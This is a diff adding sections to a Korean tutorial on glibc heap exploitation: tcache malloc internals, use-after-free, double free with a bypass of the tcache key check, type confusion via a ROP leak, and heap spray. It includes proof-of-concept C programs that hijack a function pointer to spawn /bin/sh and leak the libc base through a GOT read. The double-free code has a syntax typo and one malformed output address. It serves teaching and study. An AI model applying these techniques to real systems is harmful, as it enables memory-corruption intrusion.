@@ -258,7 +258,275 @@ V
 -> NULL
 ```
 
+## malloc 함수
+ 이제 메모리 할당 과정을 살펴보자. 상기에 서술하였듯이 Malloc Algorithm은 tcache에 가장 높은 우선순위를 부여한다. [2]는 이러한 Malloc Algorithm을 다음과 같이 구현한다 (tcache 부분까지 발췌).
+ 
+```C
+/* When "x" is from chunksize().  */
+# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
 
+...
+
+/* pad request bytes into a usable size -- internal version */
+
+#define request2size(req)                                         \
+  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
+   MINSIZE :                                                      \
+   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
+
+/* Check if REQ overflows when padded and aligned and if the resulting value
+   is less than PTRDIFF_T.  Returns TRUE and the requested size or MINSIZE in
+   case the value is less than MINSIZE on SZ or false if any of the previous
+   check fail.  */
+static inline bool
+checked_request2size (size_t req, size_t *sz) __nonnull (1)
+{
+  if (__glibc_unlikely (req > PTRDIFF_MAX))
+    return false;
+  *sz = request2size (req);
+  return true;
+}
+
+...
+
+void *
+__libc_malloc (size_t bytes)
+{
+  mstate ar_ptr;
+  void *victim;
+
+  _Static_assert (PTRDIFF_MAX <= SIZE_MAX / 2,
+                  "PTRDIFF_MAX is not more than half of SIZE_MAX");
+
+  void *(*hook) (size_t, const void *)
+    = atomic_forced_read (__malloc_hook);
+  if (__builtin_expect (hook != NULL, 0))
+    return (*hook)(bytes, RETURN_ADDRESS (0));
+#if USE_TCACHE
+  /* int_free also calls request2size, be careful to not pad twice.  */
+  size_t tbytes;
+  if (!checked_request2size (bytes, &tbytes))
+    {
+      __set_errno (ENOMEM);
+      return NULL;
+    }
+  size_t tc_idx = csize2tidx (tbytes);
+
+  MAYBE_INIT_TCACHE ();
+
+  DIAG_PUSH_NEEDS_COMMENT;
+  if (tc_idx < mp_.tcache_bins
+      && tcache
+      && tcache->counts[tc_idx] > 0)
+    {
+      return tcache_get (tc_idx);
+    }
+  DIAG_POP_NEEDS_COMMENT;
+#endif
+```
+
+위 코드에 따라 tcache_get()이 메모리를 할당하게 되고 이는 [2]가 다음과 같이 정의한다.
+
+```C
+/* Caller must ensure that we know tc_idx is valid and there's
+   available chunks to remove.  */
+static __always_inline void *
+tcache_get (size_t tc_idx)
+{
+  tcache_entry *e = tcache->entries[tc_idx];
+  tcache->entries[tc_idx] = e->next;
+  --(tcache->counts[tc_idx]);
+  e->key = NULL;
+  return (void *) e;
+}
+```
+
+위 코드에 따라 tcache_get()은 tc_idx로 참조되는 리스트의 entry (head 노드)를 리턴한다. 이때, tc_idx는 요청된 크기와 이미 정의된 매크로인 MINSIZE, MALLOC_ALIGNMENT에 의존한다.
+
+# UAF (Use After Free)
+ UAF 취약점은 이름에서도 유추할 수 있듯이 메모리를 free한 후에도 이를 사용할 수 있을 때 발생한다. 즉, 이 취약점이 발생하는 상황은 일정 크기의 메모리가 할당되고 해제된 후에 다시 같은 크기의 메모리가 할당되는 것이다. 그럼 앞서 설명한 malloc 함수와 free 함수의 동작을 할당/해제/재할당이라는 상황에 비추어 살펴보자.
+ 
+ 먼저 상기에 서술한 malloc 함수와 free 함수의 동작을 정리하면 여기서 관심을 가지는 상황에서는 tcache의 영역에서 메모리의 해제와 할당이 이루어지고 이 과정은 tcache의 tc_idx로 참조되는 LIFO 구조의 단일 연결 리스트상에서 수행된다. 여기서 tc_idx는 요청된 크기와 이미 정의된 값에 의존하므로 요청된 크기가 이미 해제된 메모리의 크기와 같거나 같은 범위 내에 있다면 해제된 메모리가 존재하는 리스트에서 할당/해제가 이루어지게 된다. 이로부터 메모리를 할당하고 해제한 후에 이와 같은 크기의 메모리 할당 요청을 한다면 동일한 메모리 주소가 리턴될 것이라는 결론을 내릴 수 있다.
+ 
+ 상기의 결론은 만약 메모리를 할당하고 해제한 후에 같은 크기로 재할당한 메모리로 어떤 작업을 수행한다고 할 때, 이전에 할당되었던 메모리의 데이터가 사라지지는 않음을 의미한다. 이는 할당/해제 과정에서 일정 범위의 데이터에는 어떠한 연산도 수행되지 않기 때문이다. 이는 다음 예시 코드가 설명한다.
+ 
+```C
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+struct foo {
+       char buf[8];
+       void (*func)(void);
+};
+
+/* vuln: 0x400646 */
+void vuln(void)
+{
+	system("/bin/sh");
+}
+
+/* gcc -no-pie uaf.c -o uaf */
+int main(int argc, char *argv[])
+{
+	struct foo *mem1, *mem2, *mem3;
+
+	if (argc != 2) return -1;
+
+	mem1 = malloc(sizeof(struct foo));
+	mem2 = malloc(sizeof(struct foo));
+	strcpy(mem1->buf, argv[1]);
+	printf("mem1: %p\n", mem1);
+	printf("mem2: %p\n", mem2);
+	free(mem1);
+	mem3 = malloc(sizeof(struct foo));
+	printf("mem3: %p\n", mem3);
+	printf("mem3->func: %p\n", mem3->func);
+	mem3->func();
+	return 0;
+}
+```
+
+위 코드를 실행한 결과는 다음과 같다.
+
+```bash
+jky@DESKTOP-1D1MMF0:~/c_programming$ ./uaf $(printf "AAAAAAAA\x46\x06\x40\x00")
+mem1: 0x8e1010
+mem2: 0x8e1030
+mem3: 0x8e1010
+mem3->func: 0x400646
+$ exit
+jky@DESKTOP-1D1MMF0:~/c_programming$
+```
+
+위 실행 결과를 보면 mem1과 mem3의 주소가 같고, mem1에 저장되었던 데이터의 일부가 mem3에서 아직 남아있음을 알 수 있다. 다만, 위의 예시에서는 함수의 주소를 미리 알 수 있었지만 대부분의 경우에는 ASLR과 PIE의 도입으로 불가능하다. 따라서 메모리 읽기 프리미티브와 연계되어 사용되어야 할 것이다. 또는, 함수의 주소에 대한 예측이 필요할 것이다.
+
+# DFB (Double Free Bug)
+ DFB도 이름에서 유추할 수 있듯이 메모리를 두 번 free할 수 있을 때 발생하는 취약점이다.
+ 
+ Perthread cache (tcache)의 메모리 해제 과정을 다시 살펴보면 tcache bin의 head 노드를 변경하는 방식으로 메모리를 free list에 추가하여 해제를 수행한다. 이때 같은 메모리를 두 번 연속으로 해제하게 되면 아무런 방어기제가 없다고 가정했을 때 다음과 같이 free list가 구성된다.
+ 
+```
+1. 메모리 할당 (주소: 0x23922a0)
+
+2. 할당된 메모리 해제
+   tcache_entry -> [ 0x23922a0 ] -> NULL
+
+3. 같은 메모리 해제 (두 번 연속으로 해제)
+   tcache_entry -> [ 0x23922a0 ] -> [ 0x23922a0 ] -> NULL
+```
+
+그리고 tcache의 메모리 할당 과정을 다시 생각해보면 tcache bin의 head 노드를 변경하여 할당하므로 같은 범위 내의 크기가 요청된다면 두 번 연속으로 해제된 메모리가 있는 리스트에서 같은 메모리를 두 번 할당하게 된다. 그러나 이는 [2]가 정의한 free 함수에서 __glibc_unlikely (e->key == tcache)를 조건문으로 가지는 if 블록에 의해 탐지될 수 있다. 그러나 반대로, 이 if 블록에 걸리지 않는다면 double free는 tcache상에서 탐지되지 못하므로 이 방법으로 우회할 수 있다. 다만, 이는 해제된 메모리에 대한 쓰기 프리미티브가 존재하는 상황에서 성립한다. 이때 tcache의 key 멤버변수는 next 멤버변수 다음에 위치하므로 next의 크기만큼 더한 위치의 메모리에 어떤 값이든 쓸 수 있다면 앞서 언급한 if 블록에 걸리지 않게 된다. 이는 다음과 같은 메모리 구성을 의미한다.
+
+```
+할당된 메모리:
++---------------+
+|   data        |<--next
++---------------+
+|   data        |<--key
++---------------+
+|    ....       |
++---------------+
+
+메모리 해제 시, double free 방어기제 적용:
++---------------+
+|   next        |
++---------------+
+|   key         |<-- tcache (전역변수)에 저장된 값
++---------------+
+|    ....       |
++---------------+
+
+메모리 해제 후, key 조작:
++---------------+
+|   next        |
++---------------+
+|   0x41...     |<-- tcache (전역변수)의 값과 달라지므로 if 블록 통과
++---------------+
+|    ....       |
++---------------+
+```
+
+이렇게 double free가 가능한 상황에서 next 멤버변수를 조작하여 double free를 임의 메모리 읽기/쓰기 프리미티브로 만들 수 있다. 이는 다음과 같이 free list를 구성한다는 것을 의미한다.
+
+```
+[ 할당될 메모리 ] -> [ 0x4141414141... ] -> ...
+                ^
+                |
+                +---조작된 next 멤버변수
+```
+
+이를 다음과 같은 예시 코드로 살펴보자.
+
+```C
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+/* gcc -no-pie dfb.c -o dfb */
+int main()
+{
+    unsigned char *mem1, *mem2, *mem3;
+    unsigned char *libc_base_addr;
+
+    mem1 = malloc(4);
+    printf("mem1: %p\n", mem1);
+    free mem1);
+    *(mem1 + 8) = 0xef;
+    free (mem1);
+    *((uint64_t *) mem1) = 0x0000000000404020; /* address of printf (GOT) */
+    mem2 = malloc(4);
+    printf("mem2: %p\n", mem2);
+    printf("mem2->next: %016lx\n", *((uint64_t *) mem2));
+    mem3 = malloc(4);
+    printf("mem3: %p\n", mem3);
+    
+    /* At this point, mem3 content is the absolute address of printf */
+    printf("mem3 content: %016lx\n", *((uint64_t *) mem3));
+
+    /* 0x61cc0 is a index of printf in libc.so.6 */
+    libc_base_addr = *((uint64_t *) mem3) - 0x61cc0;
+    printf("libc base address: %016lx\n", libc_base_addr);
+
+    /* 0x1b45bd is a index of /bin/sh string in libc.so.6 */
+    printf("/bin/sh: %p %s\n", libc_base_addr + 0x1b45bd,
+    		     	       libc_base_addr + 0x1b45bd);
+    return 0;
+}
+```
+
+위 코드를 실행하면 다음과 같은 결과를 얻는다.
+
+```
+mem1: 0x7f82a0
+mem2: 0x7f82a0
+mem2->next: 0000000000404020
+mem3: 0x404020
+mem3 content: 00007fb4d4001cc0
+libc base address: 00007fb4d4d3fa000
+/bin/sh: 0x7fb4d41545bd /bin/sh
+```
+
+ 정리하면 해제된 메모리에 대한 쓰기 프리미티브가 존재하는 상황에서는 tcache상에서 할당된 메모리를 해제했을 때의 key 멤버변수를 조작하여 double free 방어기법을 우회할 수 있다. 그리고 이러한 상황에서 next 멤버변수를 조작하여 임의 메모리 읽기 (상기 예시 코드에서는 printf()의 GOT)가 가능하고 또한 쓰기도 가능함을 유추할 수 있다.
+ 
+# Type Confusion
+ Type Confusion은 말그대로 type에 대한 혼동을 발생시킬 수 있을 때 기능하는 취약점이다. 이러한 type confusion 취약점의 정의는 type confusion을 사용한 공격의 사례로부터 유추할 수 있다. [4, Sec. 4.1.]은 같은 타입이길 기대하는 JIT에 대해 실제로는 서로 다른 타입을 저장하도록 만듦으로써 결과적으로 JIT가 서로 다른 type에도 type 검사를 수행하지 않는 상황을 구성할 수 있고 이로부터 강력한 프리미티브가 생성될 수 있음을 보였다. 그리고 [5]는 NetConnection 객체가 아닌 것 (정의되지 않은 숫자 등)을 전달하였을 때 ASnative가 비정상적인 객체를 받을 수 있고 이로부터 edi 값의 위치를 제어할 수 있음을 보였다. 이러한 공격의 사례들을 볼 때, type confusion 취약점이라는 것은 주어질 것이라고 기대되는 type과 다른 type의 값을 주입할 수 있을 때 발생하는 것이고, 이 취약점이 방어되지 못할 때는 공격자가 타깃에 대한 프리미티브의 생성 또는 제어가 가능해짐을 알 수 있다.
+ 
+ 위에서 제시한 공격 사례가 아닌 좀 더 간단한 예시를 생각해본다면 ROP 체인에서 puts()와 같은 출력 함수를 사용한 메모리 누수가 있다. 이는 다음과 같은 공격 페이로드 구성에서 나타난다.
+ 
+```
+...
+[ pop rdi; ret 가젯의 주소 ]
+[ puts()의 GOT 주소       ]
+[ puts()의 PLT 주소       ]
+...
+```
+
+위 페이로드에서 puts()는 puts()의 (동적 링커에 의해 계산된) 절대 주소를 출력한다. 다만, 이는 유효한 문자열은 아니고 그저 바이트열일 뿐이다. 그러나 이에 대한 검사는 없으므로 출력된 문자열을 숫자로 변환하여 puts()의 절대 주소를 얻을 수 있다. 이는 (비록 간단하긴 하지만) type confusion을 이용한 메모리 읽기 프리미티브의 구성이라고 볼 수도 있을 것이다.
+
+# Heap Spray
+ [6]은 힙 공격기법 연구의 역사를 정리하면서 힙 영역에 적용되는 ASLR을 우회하는 기법이 Heap Spray라고 설명한다. 그리고 [7, Ch. 1.1.1]은 heap spray 기법을 다음과 같이 좀 더 구체적으로 설명한다: 힙에서 공격코드를 보다 수월하게 찾을 수 있도록 만드는 기법으로 공격자는 힙에 공격코드의 수많은 복사본을 저장할 수 있고 이는 프로그램의 실행흐름이 이러한 수많은 복사본 중 하나로 점프하도록 만드는데 그 목적이 있으며 이때 공격자는 공격의 가능성을 높이기 위해 NOP Sled로 공격코드의 시작 부분을 구성할 수 있다. 이로부터 Heap Spray 기법은 공격코드를 실행하기 위해서 그 복사본을 가능한 많이 힙에 저장하고 이때 공격의 가능성을 높이기 위해서 주로 NOP Sled를 사용하는 등의 방법을 의미한다고 볼 수 있다.
 
 # References
 [1] Carlos Donell et al., "MallocInternals", glibc wiki, 2022. [Online]. Available: https://sourceware.org/glibc/wiki/MallocInternals, [Accessed Jul. 01, 2022]
